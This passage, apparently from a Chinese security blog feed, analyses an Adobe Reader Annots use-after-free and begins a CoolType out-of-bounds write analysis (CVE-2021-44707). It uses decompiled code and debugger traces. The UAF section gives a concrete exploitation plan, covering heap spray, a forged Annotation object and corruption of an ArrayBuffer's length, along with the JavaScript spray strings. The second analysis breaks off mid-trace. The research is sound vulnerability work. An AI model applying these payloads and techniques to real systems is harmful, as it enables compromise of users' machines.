<p>继续分析<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第一个函数<code class="language-plaintext highlighter-rouge">sub_2216AAAD</code>正是崩溃函数，获取了Annotation+0x2C位置的值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __stdcall sub_221CEBB7(wchar_t *a1, int object_0, int a3)
{
  int *v4; // esi
  __int16 v5; // cx
  int v6; // eax
  int v7; // esi
  int v8; // edi
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  char v11[8]; // [esp+10h] [ebp-20h] BYREF
  _DWORD *v12; // [esp+18h] [ebp-18h]
  int v13; // [esp+1Ch] [ebp-14h] BYREF
  __int16 v14[5]; // [esp+22h] [ebp-Eh] BYREF
  int v15; // [esp+2Ch] [ebp-4h]

  if ( !object_0 )
    return 0;
  v4 = sub_2216AAAD(object_0);                  // 获取Annotation+0X2C，崩溃函数
  if ( word_2273055C == (__int16)0xFFFF )
    v5 = sub_22123B90(&amp;word_2273055C);
  else
    v5 = word_2273055C;
  v14[0] = v5;
  v6 = updateobj(v4, (int)v11, (unsigned __int16 *)v14);
  v7 = 0;
  v8 = *(_DWORD *)(*(_DWORD *)v6 + 0x14);
  v13 = v8;
  if ( v8 )
    goto LABEL_10;
  v9 = (_DWORD *)alloc_0(0xC, 1);
  v12 = v9;
  v15 = 0;
  if ( v9 )
  {
    v10 = sub_221CA131(v9, a1, object_0, (int)&amp;v13);// markup
    v8 = v13;
    v7 = (int)v10;
  }
  v15 = 0xFFFFFFFF;
  if ( v8 )
  {
LABEL_10:
    if ( !v7 )
      v7 = (*(int (__cdecl **)(int, const wchar_t *))(vtable + 0xCC))(v8, "this");
  }
  if ( a3 )
    *(_DWORD *)a3 = v7;
  return v8;
}
</code></pre></div></div>

<p>在调试器中执行到该函数，传入的参数为Annots[0]对象的指针，因此能够正确获取到Annotation+0x2C的值并返回：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
eax=0536d6c4 ebx=85de8ff8 ecx=809b4fa0 edx=01000002 esi=6b5c4ff0 edi=24d74c98
eip=6e9cebd3 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
Annots!PlugInMain+0xb0da3:
6e9cebd3 e8d5bef9ff      call    Annots!PlugInMain+0x4cc7d (6e96aaad)
0:000&gt; dd ecx L18
809b4fa0  6ee3616c 00000000 00000000 00000001
809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
809b4fd0  00000000 00000000 00000000 00000000
809b4fe0  00000000 00000000 00000000 00000000
809b4ff0  00000000 00000000 00000000 00000000
0:000&gt; p
eax=83dd4ff0 ebx=85de8ff8 ecx=6e96aaf7 edx=01000002 esi=6b5c4ff0 edi=24d74c98
eip=6e9cebd8 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
Annots!PlugInMain+0xb0da8:
6e9cebd8 668b0d5c05f36e  mov     cx,word ptr [Annots!PlugInMain+0x61272c (6ef3055c)] ds:002b:6ef3055c=14c8
0:000&gt; dd 83dd4ff0 L4	//获取到Annotation+0x2C处的值
83dd4ff0  86ed0fe8 00000000 00000000 d0d0d0d0
</code></pre></div></div>

<p>继续向下执行到<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数传入了Annots[0]对象的指针，执行完毕该函数发现Annost[1]对象被释放：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
eax=674eeff0 ebx=85de8ff8 ecx=674eeff0 edx=00000000 esi=00000000 edi=00000000
eip=6e9cec3f esp=0536d694 ebp=0536d6d0 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
Annots!PlugInMain+0xb0e0f:
6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)
0:000&gt; dps esp L3
0536d694  2f8e8fc0
0536d698  809b4fa0	//Annots[0]对象的指针
0536d69c  0536d6bc
0:000&gt; dd 809b4fa0 L18	//Annots[0]
809b4fa0  6ee3616c 00000000 00000000 00000001
809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
809b4fd0  00000000 00000000 00000000 00000000
809b4fe0  00000000 00000000 00000000 00000000
809b4ff0  00000000 00000000 00000000 00000000
0:000&gt; dd 64cfafa0 L18	//Annots[1]
64cfafa0  6ee3616c 00000000 00000000 00000001
64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
64cfafd0  00000000 00000000 00000000 00000000
64cfafe0  00000000 00000000 00000000 00000000
64cfaff0  00000000 00000000 00000000 00000000
0:000&gt; p
eax=674eeff0 ebx=85de8ff8 ecx=6e9ca252 edx=09d50000 esi=00000000 edi=00000000
eip=6e9cec44 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Annots!PlugInMain+0xb0e14:
6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0536d6bc=69c80fb8
0:000&gt; dd 809b4fa0 L18	//Annots[0]
809b4fa0  6ee3616c 00000000 00000000 00000001
809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ffc
809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
809b4fd0  00000000 00000000 00000000 00000000
809b4fe0  00000000 00000000 00000000 00000000
809b4ff0  00000000 00000000 00000000 00000000
0:000&gt; dd 64cfafa0 L18	//Annots[1]
64cfafa0  ???????? ???????? ???????? ????????
64cfafb0  ???????? ???????? ???????? ????????
64cfafc0  ???????? ???????? ???????? ????????
64cfafd0  ???????? ???????? ???????? ????????
64cfafe0  ???????? ???????? ???????? ????????
64cfaff0  ???????? ???????? ???????? ????????
</code></pre></div></div>

<p>返回到漏洞函数<code class="language-plaintext highlighter-rouge">sub_221CC5EA</code>，会循环执行<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第二次执行时则传入了Annots[1]对象的指针，而此时Annots[1]对象已经被释放。因此在获取Annots[1]+0x2C时便会出现非法访问异常：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 2 hit
eax=5825aff0 ebx=85de8ffc ecx=55ae2ff8 edx=0536d604 esi=6b5c4ff4 edi=24d74c98
eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
Annots!PlugInMain+0xaea3d:
6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)
0:000&gt; dps 0536d6d8 L3
0536d6d8  2f8e8fc0
0536d6dc  64cfafa0	//此时传入的参数为Annots[1]对象的指针
0536d6e0  00000000
0:000&gt; g
(135c.14cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0536d68c ebx=85de8ffc ecx=64cfafa0 edx=0536d604 esi=6b5c4ff4 edi=64cfafa0
eip=6e96aabb esp=0536d678 ebp=0536d698 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
Annots!PlugInMain+0x4cc8b:
6e96aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:64cfafcc=????????	//获取Annots[1]+0x2C时出错
</code></pre></div></div>

<p>关闭page heap后发现执行完毕<code class="language-plaintext highlighter-rouge">sub_221CA131</code>后，Annost[1]对象被container内的字符串占据，并最终崩溃于0x41414141：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
eax=0cadbdd0 ebx=0ca3fe58 ecx=0cadbdd0 edx=00000000 esi=00000000 edi=00000000
eip=6e9cec3f esp=0502d4e4 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Annots!PlugInMain+0xb0e0f:
6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)	//sub_221CA131
0:000&gt; dd 0c8e9170 L18	//Annots[0]
0c8e9170  6ee3616c 00000000 00000000 00000001
0c8e9180  00000000 0ca6db78 0ca40128 0ca40128
0c8e9190  0ca4012c 00000000 00000000 0cadb368
0c8e91a0  00000000 00000000 00000000 00000000
0c8e91b0  00000000 00000000 00000000 00000000
0c8e91c0  00000000 00000000 00000000 00000000
0:000&gt; dd 0c8e8c90 L18	//Annots[1]
0c8e8c90  6ee3616c 00000000 00000000 00000001
0c8e8ca0  00000000 0ca6eca8 0ca40148 0ca4014c
0c8e8cb0  0ca4014c 00000000 00000000 0cadba40
0c8e8cc0  00000000 00000000 00000000 00000000
0c8e8cd0  00000000 00000000 00000000 00000000
0c8e8ce0  00000000 00000000 00000000 00000000
0:000&gt; p
eax=0cadbdd0 ebx=0ca3fe58 ecx=6e9ca252 edx=05210000 esi=00000000 edi=00000000
eip=6e9cec44 esp=0502d4f0 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Annots!PlugInMain+0xb0e14:
6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0502d50c=0cac1d48
0:000&gt; dd 0c8e9170 L18	//Annots[0]
0c8e9170  6ee3616c 00000000 00000000 00000001
0c8e9180  00000000 0ca6db78 0ca40128 0ca4012c
0c8e9190  0ca4012c 00000000 00000000 0cadb368
0c8e91a0  00000000 00000000 00000000 00000000
0c8e91b0  00000000 00000000 00000000 00000000
0c8e91c0  00000000 00000000 00000000 00000000
0:000&gt; dd 0c8e8c90 L18	//Annots[1]
0c8e8c90  41414141 41414141 41414141 41414141
0c8e8ca0  41414141 41414141 41414141 41414141
0c8e8cb0  41414141 41414141 41414141 41414141
0c8e8cc0  41414141 41414141 41414141 41414141
0c8e8cd0  41414141 41414141 41414141 41414141
0c8e8ce0  41414141 41414141 41414141 00004141
0:000&gt; g
(c0.20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0502d4c4 ebx=0502d512 ecx=41414141 edx=0502d454 esi=41414141 edi=41414141
eip=6e923c60 esp=0502d4a8 ebp=0502d4a8 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
Annots!PlugInMain+0x5e30:
6e923c60 8b01            mov     eax,dword ptr [ecx]  ds:002b:41414141=????????
</code></pre></div></div>

<p>结合POC知晓了漏洞的成因：执行<code class="language-plaintext highlighter-rouge">doc.getAnnots(0)</code>时会获取page[0]上所有的Annotation对象，在获取对象时会查询对象的Markup属性。由于aaa对象在函数中被添加，且该对象的Markup属性为回调函数，因此在获取aaa对象的Markup属性时会执行该回调函数调用<code class="language-plaintext highlighter-rouge">bbb.destroy();</code>释放bbb对象。紧接着0x60大小的template字符串刚好占位被释放的bbb对象的内存，随后获取bbb对象时访问了template字符串，造成了UAF。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<p>UAF漏洞的利用思路一般为通过占位释放的对象内存使得后续解析伪造的对象时造成特定地址越界写或内存释放，在该漏洞中寻找到的利用方式为释放指定内存地址的ArrayBuffer对象，随后通过字符串占位该对象内存修改ArrayBuffer对象的byteLength为0xFFFFFFFF。</p>

<p>继续深入分析<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数为获取Annotation对象Markup属性的函数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_221CA131(_DWORD *this, wchar_t *a2, int obj_annot, int a4)
{
  int v5; // esi
  int v6; // eax
  int v7; // ebx
  __int16 v8; // ax
  int v9; // ecx
  int *v10; // eax
  char v12[8]; // [esp+10h] [ebp-1Ch] BYREF
  _DWORD *v13; // [esp+18h] [ebp-14h]
  __int16 v14[5]; // [esp+1Eh] [ebp-Eh] BYREF
  int v15; // [esp+28h] [ebp-4h]

  v13 = this;
  *this = &amp;CAESAnnot::`vftable';
  v5 = vtable;
  v15 = 0;
  v6 = sub_221D153D(a2);
  v7 = (*(int (__cdecl **)(wchar_t *, _DWORD, _DWORD, int))(v5 + 0x98))(a2, 0, 0, v6);// 调用Markup回调函数
  (*(void (__cdecl **)(int, const wchar_t *, _DWORD *))(vtable + 0xC8))(v7, "this", this);// 检查参数
  (*(void (__cdecl **)(int, const wchar_t *, int (__cdecl *)(int)))(vtable + 0xC8))(// 检查参数
    v7,
    "getPDAnnot",
    getPDAnnot);
  this[1] = obj_annot;
  sub_221249E4((int)this);                      // 释放内存
  *(_DWORD *)a4 = v7;
  (*(void (__cdecl **)(wchar_t *, int))(vtable + 0x1AC))(a2, v7);
  v8 = word_2273055C;
  if ( word_2273055C == (__int16)0xFFFF )
    v8 = sub_22123B90(&amp;word_2273055C);
  v9 = this[1];
  v14[0] = v8;
  v10 = sub_2216AAAD(v9);
  *(_DWORD *)(*(_DWORD *)sub_221CA0A5(v10, (int)v12, (unsigned __int16 *)v14) + 0x14) = v7;
  (*(void (__thiscall **)(_DWORD, wchar_t *, int, const wchar_t *))(vtable + 0x15C))(
    *(_DWORD *)(vtable + 0x15C),
    a2,
    v7,
    "Markup");
  *((_WORD *)this + 4) = 1;
  return this;
}
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">sub_221249E4</code>传入的参数为获取到的Annotation对象指针，内部比较了Annots[6]和Annots[7]的值，如果一致则调用free函数释放Annots[6]存储的内存：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20221124143936130.png" alt="" /></p>

<p>分析到这里，整个利用思路就很清晰了：</p>

<ol>
  <li>堆喷0xffe8大小的ArrayBuffer对象，在0x10100048地址处稳定构造一个ArrayBuffer对象。</li>
  <li>在0x10100048的ArrayBuffer对象中伪造一个Annotation对象，通过各种检查措施。</li>
  <li>修改占用Annost[1]对象的字符串，使得Annost[1]+0x18处和Annost[1]+0x1C处地址为0x10100048，并将Annost[1]+0x2C指向ArrayBuffer对象中伪造的Annotation对象。</li>
  <li>成功释放0x10100048的ArrayBuffer对象后，利用字符串占位该处内存，将byteLength修改为0xFFFFFFFF。</li>
</ol>

<p>成功构造后整个利用流程如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 1 hit
eax=045dc264 ebx=0be38458 ecx=0c0a9058 edx=00104004 esi=00000000 edi=0d29a0a0
eip=6352c80e esp=045dc22c ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
Annots!PlugInMain+0xae9de:
6352c80e e885ec0900      call    Annots!PlugInMain+0x14d668 (635cb498)	//sub_2226B498，获取Annotation对象
0:000&gt; dps esp L3
045dc22c  0be38458
045dc230  00000000
045dc234  045dc264
0:000&gt; dd 045dc264 L4
045dc264  00000000 00000000 00000000 ffffffff
0:000&gt; p
eax=00000002 ebx=0be38458 ecx=635cb691 edx=00000003 esi=00000000 edi=0d29a0a0
eip=6352c813 esp=045dc244 ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
Annots!PlugInMain+0xae9e3:
6352c813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:045dc268=0c48b5a8
0:000&gt; dd 045dc264 L4
045dc264  0c48b5a0 0c48b5a8 0c48b5b0 ffffffff
0:000&gt; dd 0c48b5a0 L4
0c48b5a0  0c057f20 0c059510 00000000 00000000
0:000&gt; dd 0c059510 L18	//Annots[1]
0c059510  6399616c 00000000 00000000 00000001
0c059520  00000000 0bfd56b0 0c22af20 0c22af24
0c059530  0c22af24 00000000 00000000 0c48c968
0c059540  00000000 00000000 00000000 00000000
0c059550  00000000 00000000 00000000 00000000
0c059560  00000000 00000000 00000000 00000000
0:000&gt; g
Breakpoint 2 hit
eax=0e27e436 ebx=00000000 ecx=713f21b0 edx=40404040 esi=713f21b0 edi=0c48b6d8
eip=6352a170 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
Annots!PlugInMain+0xac340:
6352a170 ffd6            call    esi {AcroRd32!AIDE::PixelPartInfo::operator=+0x174960 (713f21b0)}	//调用Markup回调函数
0:000&gt; dd 0c059510 L18	//Annots[1]
0c059510  6399616c 00000000 00000000 00000001
0c059520  00000000 0bfd56b0 0c22af20 0c22af24
0c059530  0c22af24 00000000 00000000 0c48c968
0c059540  00000000 00000000 00000000 00000000
0c059550  00000000 00000000 00000000 00000000
0c059560  00000000 00000000 00000000 00000000
0:000&gt; p
eax=3d582e78 ebx=00000000 ecx=65b0db87 edx=65c8f74e esi=713f21b0 edi=0c48b6d8
eip=6352a172 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Annots!PlugInMain+0xac342:
6352a172 8b0de08aaa63    mov     ecx,dword ptr [Annots!PlugInMain+0x62acb0 (63aa8ae0)] ds:002b:63aa8ae0=08490970
0:000&gt; dd 0c059510 L18	//调用回调函数后，Annots[1]被字符串占位
0c059510  ffff9090 ffffffff 10100048 10100048
0c059520  10100048 10100048 10100048 10100048
0c059530  10100048 10100058 10100058 10100058
0c059540  10100058 10100058 10100058 10100058
0c059550  10100058 10100058 10100058 10100058
0c059560  10100058 10100058 10100058 00009090
0:000&gt; 	//接着循环执行sub_221CEBB7，第二次执行到sub_221CA131函数，该函数会解析被占位的Annots[1]
eax=6352ee70 ebx=3d582f68 ecx=0c059510 edx=63977d5f esi=70aeacf0 edi=0c48baf8
eip=6352a1c1 esp=045dc1bc ebp=045dc1ec iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0xac391:
6352a1c1 e81ea8f5ff      call    Annots!PlugInMain+0x6bb4 (634849e4)
0:000&gt; dd 10100048 	//ArrayBuffer对象
10100048  00000000 0000ffe8 00000000 00000000
10100058  10100068 00000001 00000000 00000000
10100068  0c49af10 0c49af10 0c49af10 00000100
10100078  00000000 00000000 00000000 00000000
10100088  00000000 00000000 00000000 00000000
10100098  00000000 00000000 00000000 00000000
101000a8  00000000 00000000 00000000 00000000
101000b8  00000000 00000000 00000000 00000000
0:000&gt; p
eax=0c22af70 ebx=3d582f68 ecx=0c22af70 edx=04820000 esi=70aeacf0 edi=0c48baf8
eip=6352a1c6 esp=045dc1c0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Annots!PlugInMain+0xac396:
6352a1c6 8b4510          mov     eax,dword ptr [ebp+10h] ss:002b:045dc1fc=045dc21c
0:000&gt; dd 10100048	//解析完毕ArrayBuffer对象已经被释放
10100048  048200c0 3d6500a0 00000000 00000000
10100058  10100068 00000001 00000000 00000000
10100068  0c49af10 0c49af10 0c49af10 00000100
10100078  00000000 00000000 00000000 00000000
10100088  00000000 00000000 00000000 00000000
10100098  00000000 00000000 00000000 00000000
101000a8  00000000 00000000 00000000 00000000
101000b8  00000000 00000000 00000000 00000000
0:000&gt; dd 10100058 L4	//此时Annots[1]+0x2C指向的伪造的Annotation对象均能通过后续的检查
10100058  10100068 00000001 00000000 00000000
0:000&gt; dd 10100068 L6
10100068  0c49af10 0c49af10 0c49af10 00000100
10100078  00000000 00000000
//随后利用字符串对象占位被释放的ArrayBuffer对象，byteLength被修改为0xFFFFFFFF
0:018&gt; dd 10100048
10100048  ffff9090 ffffffff 0cb90088 00000000
10100058  ffffffff ffffffff ffffffff ffffffff
10100068  ffffffff ffffffff ffffffff ffffffff
10100078  ffffffff ffffffff ffffffff ffffffff
10100088  ffffffff ffffffff ffffffff ffffffff
10100098  ffffffff ffffffff ffffffff ffffffff
101000a8  ffffffff ffffffff ffffffff ffffffff
101000b8  ffffffff ffffffff ffffffff ffffffff
//占位Annots[1]的字符串代码
var sprayStr = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0048%u1010').repeat(7) + unescape('%u0058%u1010').repeat(14) + unescape('%u9090');
//占位ArrayBuffer的字符串代码
var sprayStrLen1 = (0x10000 / 2) - 1;
var sprayStr1 = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0000%u0000%u0000%u0000') + unescape('%uFFFF').repeat(sprayStrLen1 - 8);
</code></pre></div></div>

<p>自此整个利用结束，剩下的内容就是利用读写原语执行代码了不再赘述。</p>

<h1 id="总结">总结</h1>

<p>该漏洞主要的利用难点在于构造占位Annots[1]的字符串和伪造Annots[1]+0x2C指向的结构，这部分不仔细构造的话执行后续的函数会报错。另外也尝试用字符串占位了ArrayBuffer对象，读写原语的构造更加简单了。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 该漏洞为2021年天府杯中使用的Adobe Reader UAF漏洞，漏洞位于Annots.api模块，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44707 Adobe Reader越界写漏洞分析与利用</title><link href="http://localhost:4000/2022-11-04/CVE-2021-44707" rel="alternate" type="text/html" title="CVE-2021-44707 Adobe Reader越界写漏洞分析与利用" /><published>2022-11-04T00:00:00+08:00</published><updated>2022-11-04T00:00:00+08:00</updated><id>http://localhost:4000/2022-11-04/CVE-2021-44707</id><content type="html" xml:base="http://localhost:4000/2022-11-04/CVE-2021-44707"><![CDATA[<h1 id="漏洞概述">漏洞概述</h1>

<p>该漏洞为2021年天府杯中使用的Adobe Reader越界写漏洞，漏洞位于字体解析模块：CoolType.dll中，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>

<h1 id="原理分析">原理分析</h1>

<p>开启page heap后打开POC，Adobe崩溃于<code class="language-plaintext highlighter-rouge">CoolType + 2013E</code>处：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000046 ebx=00000002 ecx=a54d102f edx=5ab2f001 esi=34adeb2c edi=5ab2efd0
eip=6cf9013e esp=34ade848 ebp=34adea70 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293
CoolType!CTInit+0x1cb4e:
6cf9013e 807aff00        cmp     byte ptr [edx-1],0         ds:002b:5ab2f000=??
0:005&gt; dd edx -31
5ab2efd0  0000d0c0 00000000 00000000 00000000
5ab2efe0  00000000 00000000 00000000 00000000
5ab2eff0  00000000 00000000 00000000 d0c00000
5ab2f000  ???????? ???????? ???????? ????????
5ab2f010  ???????? ???????? ???????? ????????
5ab2f020  ???????? ???????? ???????? ????????
5ab2f030  ???????? ???????? ???????? ????????
5ab2f040  ???????? ???????? ???????? ????????
</code></pre></div></div>

<p>从崩溃处可以明显看出越界访问了<code class="language-plaintext highlighter-rouge">0x5ab2f000</code>处的内存，崩溃函数为：<code class="language-plaintext highlighter-rouge">CoolType +1FCB0</code>，下断于该函数查看参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:011&gt; g
Breakpoint 0 hit
eax=0000002e ebx=34fff0e4 ecx=34fff310 edx=73006500 esi=59e06fd0 edi=00000001
eip=6cf8fcb0 esp=34ffef0c ebp=34fff0a8 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
CoolType!CTInit+0x1c6c0:
6cf8fcb0 55              push    ebp
0:011&gt; dps esp+4 L7
34ffef10  59e06fd0
34ffef14  0000002e
34ffef18  34ffefc4
34ffef1c  00000001
34ffef20  00000000
34ffef24  00000001
34ffef28  00000000
0:011&gt; dd 59e06fd0
59e06fd0  d6000800 50015001 51015101 61016101
59e06fe0  62016201 31000100 7a540f51 01521d18
59e06ff0  73006e18 74002000 73006500 d0c07400
59e07000  ???????? ???????? ???????? ????????
59e07010  ???????? ???????? ???????? ????????
59e07020  ???????? ???????? ???????? ????????
59e07030  ???????? ???????? ???????? ????????
59e07040  ???????? ???????? ???????? ????????
</code></pre></div></div>

<p>传入的参数1为POC中构造的字符串，参数2则为字符串的长度，调试后发现调用了函数<code class="language-plaintext highlighter-rouge">MultiToWide</code>后，传入的字符串变成了崩溃时的内存布局：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ( !a9 || a10_ff || a5 )
    {
      v49 = size;
      MultiToWide(a5, v12, *(unsigned __int16 *)a3, (void *)v12, (int)&amp;v49);// 内部调用MultiByteToWideCharStub
      LOWORD(result) = v49;
      *(_WORD *)a3 = v49;
      result = (unsigned __int16)result;
      goto LABEL_83;
    }
......
LABEL_83:
    if ( (_WORD)result )
    {
      v44 = (_BYTE *)(v12 + 1);
      v45 = ~v12;
      v51 = ~v12;
      do
      {
        if ( *(v44 - 1) || *v44 )               // crash
</code></pre></div></div>

<p>深入分析<code class="language-plaintext highlighter-rouge">MultiToWide</code>函数，内部调用了<code class="language-plaintext highlighter-rouge">MultiByteToWideCharStub</code>函数，将字符串转化为宽字节字符串：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool __cdecl MultiToWide(int a1, int lpMultiByteStr, int cbMultiByte, void *MultByte, int MultByteSize)
{
  _BYTE *v5; // edx
  size_t size; // eax
  int v7; // edx
  int v8; // ecx
  char v9; // al
  bool v10; // zf
  unsigned __int16 CodePage; // ax
  int WideCharSize; // eax
  int v14; // esi
  int v15; // [esp+10h] [ebp-210h]
  size_t MultByteSize_1; // [esp+18h] [ebp-208h]
  char lpWideCharStr[512]; // [esp+1Ch] [ebp-204h] BYREF

  v5 = (_BYTE *)lpMultiByteStr;
  v15 = 0;
  size = *(_DWORD *)MultByteSize;
  *(_DWORD *)MultByteSize = 0;
  MultByteSize_1 = size;
  if ( !cbMultiByte )
  {
LABEL_4:
    v7 = cbMultiByte + lpMultiByteStr;
    v8 = 2 * cbMultiByte;
    *(_DWORD *)MultByteSize = 2 * cbMultiByte;
    if ( 2 * cbMultiByte )
    {
      do
      {
        v9 = *(_BYTE *)--v7;
        *((char *)MultByte + v8 - 1) = 0;
        v10 = v8 == 2;
        v8 -= 2;
        *((_BYTE *)MultByte + v8) = v9;
      }
      while ( !v10 );
    }
    return 1;
  }
  while ( (unsigned __int8)(*v5 - 0x20) &lt;= 0x5Du )
  {
    ++v5;
    if ( ++v15 &gt;= (unsigned int)cbMultiByte )
      goto LABEL_4;
  }
  CodePage = GetCodePage(a1);
  WideCharSize = off_82FF304(CodePage, 0, lpMultiByteStr, cbMultiByte, lpWideCharStr, 0x100);// 该函数为MultiByteToWideCharStub
  if ( WideCharSize &amp;&amp; WideCharSize &lt;= 0x100 )
  {
    v14 = 2 * WideCharSize;
    sub_800C383(MultByte, MultByteSize_1, lpWideCharStr, 2 * WideCharSize);// 内部调用memcpy
    *(_DWORD *)MultByteSize = v14;
    return 1;
  }
  *(_DWORD *)MultByteSize = MultByteSize_1;
  if ( sub_81443C0(a1, lpMultiByteStr, cbMultiByte, MultByte, (size_t *)MultByteSize) )
    return 1;
  *(_DWORD *)MultByteSize = MultByteSize_1;
  return sub_81442A2(a1, lpMultiByteStr, cbMultiByte, (int)MultByte, MultByteSize) != 0;
}
</code></pre></div></div>

<p>转换完毕后调用<code class="language-plaintext highlighter-rouge">sub_800C383</code>，检查当前MultByteSize大于等于2倍的WideCharSize时才会将转换后的宽字节字符串拷贝至原字符串的位置，否则将原字符串清空：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>size_t __cdecl sub_800C383(void *MultByte, size_t MultByteSize, void *WideChar, size_t WideCharSize_double)
{
  size_t v4; // esi
  int *v5; // eax
  int v7; // [esp-8h] [ebp-Ch]

  v4 = WideCharSize_double;
  if ( WideCharSize_double )
  {
    if ( MultByte )
    {
      if ( WideChar &amp;&amp; MultByteSize &gt;= WideCharSize_double )
      {
        memcpy(MultByte, WideChar, WideCharSize_double);
        return 0;
      }
      else
      {
        memset(MultByte, 0, MultByteSize);
        if ( WideChar )
        {
          if ( MultByteSize &gt;= WideCharSize_double )
            return 0x16;
          v5 = errno();
          v7 = 0x22;
        }
        else
        {
          v5 = errno();
          v7 = 0x16;
        }
        v4 = v7;
        *v5 = v7;
        invalid_parameter_noinfo();
      }
    }
    else
    {
      v4 = 0x16;
      *errno() = 0x16;
      invalid_parameter_noinfo();
    }
  }
  return v4;
}
</code></pre></div></div>

<p>调试至<code class="language-plaintext highlighter-rouge">MultiByteToWideCharStub</code>函数，转化后WideChar字符串的字符数为0x23个：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; g
Breakpoint 2 hit
eax=000003a8 ebx=1306e8a8 ecx=0b9aea08 edx=1306e8a8 esi=00000024 edi=0b9aec3c
eip=724040e9 esp=0b9ae9d8 ebp=0b9aec0c iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
CoolType!CTGetVersion+0x58ab9:
